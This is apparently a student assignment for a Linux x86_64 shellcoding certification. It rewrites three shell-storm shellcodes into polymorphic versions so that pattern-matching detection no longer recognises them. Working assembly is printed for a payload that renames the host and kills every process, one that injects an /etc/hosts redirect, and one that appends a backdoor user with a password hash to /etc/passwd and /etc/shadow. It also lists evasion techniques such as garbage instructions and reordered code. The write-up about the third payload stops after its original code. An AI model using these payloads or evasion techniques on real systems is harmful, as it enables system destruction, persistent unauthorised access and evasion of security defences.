## Assignment #6: Polymorphing
---
---
### Introduction
---
This assignment consists of taking three shellcode samples from shell-storm.org for Linux x86_64 and create polymorphic examples that are no larger than 150% the original size.

The goal of this task is to mimic the same original functionality, but to beat pattern matching techniques that could be used to fingerprint the payload.

Below are the three samples choosen with their original code and the polymorphic version with brief explanations on what has been done.

### Sample 1: `sethostname() & killall 33 bytes shellcode`
---

* Shellcode Name: Linux/x86_64 sethostname() & killall 33 bytes shellcode
* Author: zbt
* URL: [http://shell-storm.org/shellcode/files/shellcode-605.php](http://shell-storm.org/shellcode/files/shellcode-605.php)
* Description: Changes the name of the host to "Rooted!" and then kills all processes running on the system
* Original Shellcode Size: 33 bytes
* Max Size of the polymorphic Version: 49 bytes
* Size of the Created Polymorphic Version: **46 bytes (below the 150%)**

The original code for the sample is:

```asm
    section .text
        global _start
 
    _start:
 
        ;-- setHostName("Rooted !"); 22 bytes --;
        mov     al, 0xaa
        mov     r8, 'Rooted !'
        push    r8
        mov     rdi, rsp
        mov     sil, 0x8
        syscall
 
        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        push    byte 0xff
        pop     rdi
        push    byte 0x9
        pop     rsi
        syscall
```

The Polymorphic version created is (comments of changes in the code):

```asm
global _start

section .text

_start:

        jmp real_start
        string: db "Rooted !"

real_start:

        ;-- setHostName("Rooted !"); 22 bytes --;
        ;mov     al, 0xaa
        ; RAX needs the 0xaa value.
        ; 1.- First RAX will take value 70
        ; 2.- Value 100 is added to rax
        ; 3.- RDX is used to pur some garbage in the shellcode
        push 70
        pop rax
        cdq                        ; Garbage (1 byte
        push 100
        pop rdx
        add rax, rdx

        ; Let's define a string and use Relative Addressing
        ;mov     r8, 'Rooted !'
        ;push    r8
        ;mov     rdi, rsp
        lea rdi, [rel string]

        ;mov     sil, 0x8
        push 0x08
        pop rsi

        syscall

        ;-- kill(-1, SIGKILL); 11 bytes --;
        push    byte 0x3e
        pop     rax
        
        ; Let's push 0xc1 into RDI
        ; Then add RAX to RDI
        ; 0xff = 0x3e + 0xc1
        ;push    byte 0xff
        ;pop     rdi
        push byte 0xc1
        pop rdi
        add rdi, rax                    ; RAX already has 0x3e value

        ; RSI comes with a 0x08 value from previous code
        ; Just need to Inc it to get the 0x09 value
        ;push    byte 0x9
        ;pop     rsi
        inc rsi                         ; RSI has value 0x8 from previous
                                        ;  syscall, then can increment 1
                                        ;  to get the same value of 0x9
        syscall
```
Changes made:
1. A 8 bytes string is defined for storing the `"Rooted !"` instead of doing it in the stack. This **adds 10 bytes** to the shellcode and forces us to:
  - Add a `jmp` to a real start label to bypass the string
  - Use Relative Addressing later to reference to this string, and 
```asm
_start:
        jmp real_start
        string: db "Rooted !"
real_start:
```
2. In the original code, RAX needs the value `0xaa`. To acomplish the same result the code is changed adding several instructions to get the same result. With this change, from 2 bytes of size for the original `mov`, size is increased to 10 bytes (2 extra bytes used):
```asm

                                   push 0x46
                                   pop rax
mov al, 0xaa       ==>>            cdq
                                   push 0x64
                                   pop rdx
                                   add rax, rdx       ; Here RAX is 0xaa
```
3. In the original code, the '"Rooted !" string is saved in the stack, and RDI gets the address in the stack for this string. As the string has been defined as a variable, now can be accessed using relative addressing. The original code was 15 bytes, and with the change now is 7 bytes (saved 8 bytes here).
```asm
movabs r8,"Rooted !"
push r8                    ==>      lea rdi, [rel string]
mov rdi, rsp
```
4. Replace `mov` by `push;pop` instructions. Here RSI needs the value `0x08`. In the new code, the value is pushed in the stack and then poped in RSI:
```asm
mov sil, 0x08              ==>        push 0x08
                                      pop rsi
```
5. Replace the `push;pop` instructions to put `0xff` value in RDI. As RAX has value at this point of `0x3e` we add the value `0xc1` to RDI and add an instruction to sum both values into RDI:
```asm
push 0x3e                push 0x3e
pop rax                  pop rax
push 0xff    ==>         push 0xc1
pop rdi                  pop rdi
                         add rdi, rax
```
6. As RSI already has value `0x08` from before, and now requires `0x09` value, just need to increment it. Then the `mov` is replaced by a ìnc`
```asm
push 0x09
pop rsi        ==>       inc rsi
```

### Sample 2: `Add map in /etc/hosts file` 
---

* Shellcode Name: Add map in /etc/hosts file
* Author: Osanda (@OsandaMalith)
* URL: [http://shell-storm.org/shellcode/files/shellcode-896.php](http://shell-storm.org/shellcode/files/shellcode-896.php)
* Description: Adds entry in the `/etc/hosts` file
* Original Shellcode Size: 110 bytes
* Max Size of the polymorphic Version: 165 bytes
* Size of the Created Polymorphic Version: **84 bytes for V1 and 98 for V2 (below the original size)**

The original ASM file:
```asm
global _start
    section .text

_start:
    ;open
    xor rax, rax 
    add rax, 2  ; open syscall
    xor rdi, rdi
    xor rsi, rsi
    push rsi ; 0x00 
    mov r8, 0x2f2f2f2f6374652f ; stsoh/
    mov r10, 0x7374736f682f2f2f ; /cte/
    push r10
    push r8
    add rdi, rsp
    xor rsi, rsi
    add si, 0x401
    syscall

    ;write
    xchg rax, rdi
    xor rax, rax
    add rax, 1 ; syscall for write
    jmp data

write:
    pop rsi 
    mov dl, 19 ; length in rdx
    syscall

    ;close
    xor rax, rax
    add rax, 3
    syscall

    ;exit
    xor rax, rax
    mov al, 60
    xor rdi, rdi
    syscall 

data:
    call write
    text db '127.1.1.1 google.lk'
```

The following techniques are applied to polymorph the code:
- Replace the Stack Technique used to store the `/etc/hosts` string by Relative Address Technique
- Replace the JMP-CALL-POP by Relative Address 
- Lot of `mov` instructions that can be replaced by `jmp;pop`
- Several `add` after a `xor` that can be replaced by `push;pop`

Doing this, the polymorphic code results in a reduced version of **84 bytes**. [Sample_2_Polymorph_V1.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V1.nasm) file in the [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment06), contains the code for this first version

That size leaves space to add more "dumb" instructions to obfuscate the code:
- Add `push` and `pop` anywhere in the code using registers that won't interfer in the code
- Move location of instructions to parts of code where does not affect
- Creating "dumb" bucles over the code
- Add some `nop`
- Place `jmp` around modifying the code flow widdth same results

With all those tricks, the final code has **98 bytes** size. **This is a reduced size from the original shellcode**. The code ends being this:
```asm
global _start
    section .text
_start:

    jmp real_start
    text db "127.1.1.1 google.lk"   ; 19 bytes
    path db "/etc/hosts", 0x00      ; 10 bytes

real_start:

    ;open
    push 2
    pop rax
    ; Instead the stack for the string, use rel addressing
    lea rdi, [rel text]
    push rdi
    pop r9
    push rdi
    pop rdi
    add rdi, 19
    xor rsi, rsi
    add si, 0x401
    ; Garbage jump
    jmp some_jump_1

some_jump_2:
    syscall
	
    ; Garbage jump
    jmp some_jump_3
    nop
    ;write
    ; Garbage jump
some_jump_1:
    jmp some_jump_2
	
some_jump_3:
    push rax
    pop rdi

    push 1
    pop rax

write:
    push r9
    pop rsi

garbage_jump_2:
    push 19
    pop rdx
    syscall

    ;close
    push 3
    pop rax
    syscall

    ; Garbage
garbage_jump_3:				; Lot of garbage
    push 10					; Just a bucle
    pop rcx
garbage_jump_3_loop:
    push 60
    pop rax
    loop garbage_jump_3_loop
    ; End Garbage

    ;exit
    xor rdi, rdi
    syscall
```
### Sample 3:
---
* Shellcode Name: shellcode name add_user_password
* Author: Christophe G
* URL: [http://shell-storm.org/shellcode/files/shellcode-879.php](http://shell-storm.org/shellcode/files/shellcode-879.php)
* Description: Adds user "pwned" with "$pass$" password. Edits `/etc/passwd` and `/etc/shadow`
* Original Shellcode Size: 273 bytes
* Max Size of the polymorphic Version: 409 bytes
* Size of the Created Polymorphic Version: 

The original code defines a string that contains the commands to execute to add the user. For that it is using the JMP-CALL-POP technique to access and refer to thad string.

The original code is:
```asm
global _start

_start:
        jmp short findaddress
                                                                 
_realstart:
        pop rdi
        xor byte [rdi + 7] , 0x41 ; replace A to null byte "/bin/shA"
        xor byte [rdi + 10]  ,0x41 ; same "-cA"
        xor rdx , rdx
        lea rdi , [rdi]
        lea r9 , [rdi + 8]
        lea r10 , [rdi + 11]
        push rdx
        push r10
        push r9
        push rdi
        mov rsi , rsp
        add al , 59
        syscall

findaddress:
        call _realstart
        string : db "/bin/shA-cAecho pwned:x:1001:1002:pwned,,,:/home/pwned:/bin/bash >> /etc/passwd ; echo pwned:\$6\$uiH7x.vhivD7LLXY\$7sK1L1KW.ChqWQZow3esvpbWVXyR6LA431tOLhMoRKjPerkGbxRQxdIJO2Iamoyl7yaVKUVlQ8DMk3gcHLOOf/:16261:0:99999:7::: >> /etc/shadow"

```
To apply polymorphist, first thing that's going to be done is to store in the stack all those characters of the string to get rid of such long string that's using lot of bytes. Also, doing it, the code will be changed a lot and will save bytes what will let us to add more garbage instructions to be below the original shellcode size to obfuscate more the code.


























### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment04) for this assignment contains the following files:

- [Sample_1_Original.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_1_Original.nasm) : Contains the original code for the first sample shellcode, `sethostname() & killall 33`
- [Sample_1_Polymorph.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_1_Polymorph.nasm) : Polymorph version for the `sethostname() & killall` shellcode.
- [Sample_2_Original.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment6/Sample_2_Original.nasm) : Contains the original code for the second sample shellcode, `Add map in /etc/hosts file`
- [Sample_2_Polymorph_V1.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V1.nasm) : V1 of the polymorphed code for the `Add map in /etc/hosts file`.
- [Sample_2_Polymorph_V2.nasm](https://github.com/galminyana/SLAE64/blob/main/Assignment06/Sample_2_Polymorph_V2.nasm) : As the V1 left us bytes to play, created this second version even more obfuscated for th `Add map in /etc/hosts file`.

### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
